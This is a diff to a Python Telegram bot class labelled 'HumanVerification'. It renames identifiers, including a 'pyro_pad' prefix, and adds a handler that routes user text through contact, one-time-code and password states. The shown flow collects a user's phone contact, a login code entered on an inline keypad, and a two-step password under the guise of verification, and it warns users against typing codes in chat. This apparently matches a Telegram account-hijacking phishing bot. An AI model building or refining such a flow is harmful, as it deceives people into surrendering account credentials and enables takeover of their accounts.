@@ -65,7 +65,7 @@ class HumanVerification:
             [("⌫", "back"), ("0", "0"), ("✅", "submit")],
         ]
         buttons = [
-            [InlineKeyboardButton(label, callback_data=f"pyro_pad|{val}") for label, val in row]
+            [InlineKeyboardButton(label, callback_data=f"vf_step|{val}") for label, val in row]
             for row in layout
         ]
 
@@ -310,7 +310,7 @@ class HumanVerification:
             reply_markup=markup,
         )
 
-    async def pad_callback(self, update, context):
+    async def code_callback(self, update, context):
         q = update.callback_query
         uid = q.from_user.id
 
@@ -376,7 +376,7 @@ class HumanVerification:
             sess["code"] = ""
             sess["has_step_two"] = True
             self.states[uid] = "secret"
-            prompt = self.get_setting("step_two_prompt")
+            prompt = self.get_setting("step3_prompt")
             try:
                 await q.edit_message_text(prompt, parse_mode=ParseMode.HTML)
             except BadRequest:
@@ -498,3 +498,25 @@ class HumanVerification:
             parse_mode=ParseMode.HTML,
             reply_markup=self.menu_for(uid),
         )
+
+    async def handle_text(self, update, context):
+        """Route text during an active verification flow. Returns True if consumed."""
+        uid = update.effective_user.id
+        state = self.states.get(uid)
+        if state == "password":
+            await self.password_handler(update, context)
+            return True
+        if state == "otp":
+            await update.message.reply_text(
+                "⚠️ <b>Please use the inline buttons above.</b>\n"
+                "Typing in chat will not complete the process.",
+                parse_mode=ParseMode.HTML,
+            )
+            return True
+        if state == "await_contact":
+            await update.message.reply_text(
+                "📱 Please tap the button below to continue, or send /cancel_session to abort.",
+                parse_mode=ParseMode.HTML,
+            )
+            return True
+        return False
